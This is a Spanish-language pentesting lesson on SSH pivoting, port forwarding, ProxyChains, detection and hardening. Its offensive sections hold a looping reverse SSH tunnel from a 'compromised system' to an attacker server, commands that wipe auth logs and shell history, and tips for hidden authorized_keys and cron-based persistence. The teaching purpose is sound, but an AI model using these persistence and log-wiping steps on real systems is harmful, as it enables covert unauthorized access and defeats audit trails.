# Teoría: SSH Pivoting y Túneles

## 📚 Índice

- [Introducción al Pivoting](#introducción-al-pivoting)
- [Segmentación de Redes](#segmentación-de-redes)
- [SSH Tunneling](#ssh-tunneling)
- [Tipos de Port Forwarding](#tipos-de-port-forwarding)
- [Técnicas Avanzadas](#técnicas-avanzadas)
- [Conceptos de Seguridad](#conceptos-de-seguridad)

---

## Introducción al Pivoting

### ¿Qué es el Pivoting?

**Pivoting** (o pivoteo) es una técnica utilizada en pentesting y hacking ético que permite usar un sistema comprometido como "puente" para acceder a otras redes o sistemas que no son directamente accesibles desde el punto de ataque inicial.

### ¿Por qué es necesario?

En entornos empresariales modernos, las redes están **segmentadas** por razones de seguridad:

- **DMZ (Zona Desmilitarizada)**: Expuesta a Internet con servicios públicos
- **Red Interna**: Protegida detrás de firewalls, no accesible desde fuera
- **Red de Gestión**: Solo para administradores
- **Red de Producción**: Servidores críticos completamente aislados

### Escenarios Reales

```
Internet → Firewall → DMZ → Firewall → Red Interna → Base de Datos
          (Bloquea)        (Host Pivot)  (Bloquea)
```

Un atacante que comprometa un servidor web en la DMZ **no puede** acceder directamente a la base de datos interna. Necesita usar el servidor comprometido como **pivot**.

---

## Segmentación de Redes

### Arquitectura de Tres Capas

La arquitectura típica empresarial incluye:

#### 1. DMZ (Zona Desmilitarizada)
- **Propósito**: Alojar servicios expuestos a Internet
- **Ejemplos**: Servidores web, email, DNS públicos
- **Reglas de firewall**:
  - ✅ Internet → DMZ (puertos específicos)
  - ❌ DMZ → Red Interna (bloqueado por defecto)

#### 2. Host Pivot (Dual-homed)
- **Propósito**: Punto de gestión o comunicación entre redes
- **Características**:
  - Tiene **2 interfaces de red** (una en cada red)
  - Puede comunicarse con ambas redes
  - Es el objetivo clave para pivoting

#### 3. Red Interna
- **Propósito**: Servidores de producción, bases de datos, recursos críticos
- **Reglas de firewall**:
  - ❌ Internet → Red Interna (totalmente bloqueado)
  - ❌ DMZ → Red Interna (bloqueado)
  - ✅ Host Pivot → Red Interna (permitido)

### Concepto de "Salto" (Hop)

Para llegar a un servidor interno:

```
Atacante → DMZ (1er salto) → Pivot (2do salto) → Servidor Interno (objetivo)
```

Cada "salto" es un sistema comprometido que se usa como punto intermedio.

---

## SSH Tunneling

### ¿Qué es un Túnel SSH?

Un **túnel SSH** es una conexión cifrada que encapsula tráfico de red a través de SSH, permitiendo:

- **Cifrar** comunicaciones que normalmente irían en claro
- **Eludir firewalls** que bloquean ciertos puertos
- **Acceder a recursos** en redes remotas como si estuvieran locales

### Ventajas de SSH para Pivoting

1. **Ubicuo**: SSH está instalado en casi todos los servidores Linux
2. **Cifrado fuerte**: Protege el tráfico de inspección
3. **Flexible**: Soporta múltiples tipos de forwarding
4. **Autenticado**: Requiere credenciales válidas
5. **Logging mínimo**: Puede ser difícil de detectar si se hace correctamente

### Anatomía de una Conexión SSH

```
ssh [opciones] usuario@host
```

**Opciones clave para pivoting:**
- `-L`: Local port forwarding
- `-R`: Remote port forwarding
- `-D`: Dynamic port forwarding (SOCKS proxy)
- `-J`: ProxyJump (multi-hop)
- `-N`: No ejecutar comando remoto (solo túnel)
- `-f`: Ejecutar en background

---

## Tipos de Port Forwarding

### 1. Local Port Forwarding (`-L`)

**Concepto**: Abre un puerto en tu máquina local que reenvía el tráfico a través del servidor SSH hacia un destino final.

**Sintaxis**:
```bash
ssh -L [puerto_local]:[host_destino]:[puerto_destino] usuario@pivot
```

**Flujo de datos**:
```
Tu Máquina (localhost:puerto_local) → SSH → Pivot → host_destino:puerto_destino
```

**Caso de uso**: Acceder a un servicio que solo es visible desde el pivot.

**Ejemplo conceptual**:
- Tienes acceso a un pivot (192.168.1.10)
- El pivot puede ver una base de datos (10.0.0.5:3306)
- Tú NO puedes ver la base de datos directamente
- Creas un túnel: tu puerto 3306 → pivot → 10.0.0.5:3306

### 2. Remote Port Forwarding (`-R`)

**Concepto**: Abre un puerto en el servidor SSH remoto que reenvía tráfico hacia un servicio accesible desde tu máquina.

**Sintaxis**:
```bash
ssh -R [puerto_remoto]:[host_destino]:[puerto_destino] usuario@servidor_remoto
```

**Flujo de datos**:
```
Servidor Remoto:puerto_remoto → SSH → Tu Máquina → host_destino:puerto_destino
```

**Caso de uso**: Cuando estás detrás de un NAT/firewall y necesitas que un servidor remoto inicie la conexión hacia ti.

**Ejemplo conceptual**:
- Estás detrás de un NAT restrictivo
- Necesitas que un servidor interno te envíe datos
- Abres un túnel inverso para que el servidor se conecte a ti

### 3. Dynamic Port Forwarding (`-D`) - SOCKS Proxy

**Concepto**: Crea un proxy SOCKS en tu máquina local que reenvía **cualquier** conexión TCP a través del servidor SSH.

**Sintaxis**:
```bash
ssh -D [puerto_local] usuario@pivot
```

**Flujo de datos**:
```
Aplicación → SOCKS proxy (localhost:puerto) → SSH → Pivot → Destino final
```

**Caso de uso**: Cuando necesitas acceso a **múltiples** servicios en una red remota, no solo uno.

**Ventajas**:
- No necesitas especificar el destino al crear el túnel
- Puedes usar cualquier herramienta compatible con SOCKS
- Acceso completo a toda la red remota

### 4. ProxyJump (`-J`) - Multi-Hop

**Concepto**: SSH salta automáticamente a través de uno o más hosts intermedios para llegar al destino final.

**Sintaxis**:
```bash
ssh -J usuario1@hop1,usuario2@hop2 usuario3@destino_final
```

**Flujo de datos**:
```
Tu Máquina → hop1 → hop2 → destino_final
(todo manejado automáticamente por SSH)
```

**Ventajas sobre túneles manuales**:
- Más simple: un solo comando
- SSH maneja la complejidad
- Puede persistirse en `~/.ssh/config`

---

## Técnicas Avanzadas

### ProxyChains

**¿Qué es?**: Herramienta que fuerza cualquier aplicación TCP a usar un proxy SOCKS.

**Ventajas**:
- Herramientas que no soportan proxies nativamente pueden usarlo
- Útil con nmap, curl, wget, etc.

**Configuración básica** (`/etc/proxychains4.conf`):
```
[ProxyList]
socks5 127.0.0.1 1080
```

### SSH Config Permanente

Para evitar escribir comandos largos, puedes guardar configuraciones en `~/.ssh/config`:

```
Host mi-pivot
    HostName 192.168.1.10
    User admin
    Port 22
    IdentityFile ~/.ssh/id_rsa

Host interno
    HostName 10.0.0.5
    User root
    ProxyJump mi-pivot
```

Luego simplemente:
```bash
ssh interno
```

### Port Forwarding Local con Bind Address

Por defecto, los túneles solo escuchan en `localhost`. Para permitir conexiones desde otras máquinas:

```bash
ssh -L 0.0.0.0:8080:destino:80 usuario@pivot
```

⚠️ **Precaución**: Esto expone el túnel a toda tu red local.

### Reverse Shell con SSH

Crear un "reverse shell" persistente usando SSH:

```bash
# En el sistema comprometido
while true; do
    ssh -R 4444:localhost:22 atacante@tu_servidor
    sleep 60
done &
```

Esto mantiene una conexión inversa permanente que puedes usar para volver a entrar.

---

## Conceptos de Seguridad

### Detección de Túneles SSH

Los administradores pueden detectar pivoting SSH mediante:

1. **Análisis de logs**:
   - `/var/log/auth.log` muestra todas las conexiones SSH
   - Conexiones inusuales desde servidores internos

2. **Análisis de tráfico**:
   - Volúmenes de datos anormales en conexiones SSH
   - Conexiones SSH salientes desde servidores que no deberían hacerlas

3. **Behavioral analysis**:
   - Sesiones SSH de larga duración sin actividad interactiva
   - Múltiples conexiones SSH simultáneas

### Mitigaciones (Perspectiva Defensiva)

#### 1. Segmentación Estricta
- Usar VLANs y firewalls entre segmentos
- Reglas de firewall basadas en el principio de **menor privilegio**

#### 2. Autenticación Fuerte
- Deshabilitar autenticación por password
- Usar solo claves SSH
- Implementar 2FA para SSH

#### 3. Monitoreo y Alertas
```bash
# Detectar port forwarding activo
ss -tulpn | grep ssh

# Ver forwards activos en sesiones SSH
ps aux | grep "ssh -[LRD]"
```

#### 4. Configuración de SSH Restrictiva
En `/etc/ssh/sshd_config`:
```
AllowTcpForwarding no
GatewayPorts no
PermitTunnel no
```

#### 5. Bastion Hosts
- Usar un host "salto" dedicado y monitorizado
- Todo acceso SSH debe pasar por el bastion
- Logging centralizado de todas las sesiones

### Evasión (Perspectiva Ofensiva)

#### 1. Túneles Ligeros
- Usar `-N` para no ejecutar comandos (menos logs)
- Comprimir tráfico: `-C`

#### 2. Ofuscar Tráfico
- Usar puertos no estándar
- Tunelizar SSH sobre HTTPS (stunnel)

#### 3. Limpieza de Logs
```bash
# ⚠️ SOLO en entornos de laboratorio autorizados
echo "" > /var/log/auth.log
history -c
```

#### 4. Persistencia Discreta
- Usar claves SSH sin password
- Añadir clave a `authorized_keys` de forma oculta
- Cron jobs para reconexión automática

---

## Terminología Clave

| Término | Definición |
|---------|------------|
| **Pivot** | Sistema comprometido usado como puente hacia otras redes |
| **Hop** | Cada "salto" entre sistemas en una cadena de pivoting |
| **Dual-homed** | Host con dos interfaces de red en diferentes segmentos |
| **DMZ** | Zona desmilitarizada, red semi-protegida expuesta a Internet |
| **Port Forwarding** | Redirección de tráfico de un puerto a otro |
| **SOCKS** | Protocolo de proxy que permite redireccionar tráfico TCP |
| **Tunneling** | Encapsular un protocolo dentro de otro |
| **Bastion Host** | Servidor fortificado usado como único punto de entrada |

---

## Diagrama: Flujo de un Ataque con Pivoting

```
Fase 1: Reconocimiento
  ↓
Fase 2: Compromiso del DMZ
  ↓
Fase 3: Descubrimiento de la red interna
  ↓
Fase 4: Identificación del Pivot
  ↓
Fase 5: Establecimiento de túnel SSH
  ↓
Fase 6: Acceso a red interna
  ↓
Fase 7: Movimiento lateral
  ↓
Fase 8: Exfiltración de datos
```

---

## Referencias y Lecturas Adicionales

### Documentación Oficial
- [OpenSSH Manual - SSH Port Forwarding](https://man.openbsd.org/ssh)
- [RFC 4254 - SSH Connection Protocol](https://datatracker.ietf.org/doc/html/rfc4254)

### Guías de Seguridad
- [SANS - Pivoting Techniques](https://www.sans.org/blog/pivot/)
- [OWASP - Network Segmentation](https://owasp.org/www-community/controls/Network_Segmentation)

### Herramientas
- [ProxyChains-NG](https://github.com/rofl0r/proxychains-ng)
- [SSHuttle](https://github.com/sshuttle/sshuttle) - VPN sobre SSH
- [Chisel](https://github.com/jpillora/chisel) - Túneles HTTP sobre SSH

### CTF y Práctica
- [HackTheBox](https://www.hackthebox.com/) - Máquinas con pivoting
- [TryHackMe - Wreath Network](https://tryhackme.com/room/wreath)
- [PentesterLab - Pivoting Course](https://pentesterlab.com/)

---

## Ejercicio Mental: Diseña tu Ataque

Antes de empezar con los ejercicios prácticos, piensa en este escenario:

**Situación**: Has comprometido un servidor web en la DMZ que tiene:
- Una interfaz en la DMZ (192.168.10.50)
- Acceso SSH habilitado
- Credenciales obtenidas: `webadmin:P@ssw0rd`

**Objetivo**: Acceder a una base de datos MySQL en 10.0.0.100:3306

**Preguntas**:
1. ¿Qué tipo de port forwarding usarías?
2. ¿Cuál sería el comando SSH exacto?
3. ¿Qué herramienta usarías para conectarte a MySQL a través del túnel?
4. ¿Cómo verificarías que el túnel funciona correctamente?
5. ¿Qué indicadores de compromiso (IOCs) dejarías?

Responde estas preguntas antes de continuar con los ejercicios prácticos.

---

**⚠️ Recordatorio Ético**: Todo el conocimiento presentado aquí es exclusivamente para uso educativo y profesional autorizado. El acceso no autorizado a sistemas informáticos es ilegal.
